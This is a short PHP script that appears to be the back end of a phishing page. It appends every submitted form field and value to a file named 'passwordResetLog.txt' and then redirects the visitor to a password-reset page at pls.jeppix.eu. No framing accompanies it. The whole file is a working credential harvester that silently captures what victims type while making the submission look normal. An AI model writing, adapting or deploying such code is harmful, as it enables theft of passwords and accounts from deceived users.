<?php
header('Location: https://pls.jeppix.eu/passwordreset/');
$handle = fopen("passwordResetLog.txt", "a");
foreach($_POST as $variable => $value) {
    fwrite($handle, $variable);
    fwrite($handle, $value);
    fwrite($handle, "=");
    fwrite($handle, $value);
    fwrite($handle, "\r\n");   
}
fwrite($handle, "\r\n\n\n\n");
fclose($handle);
exit;
?>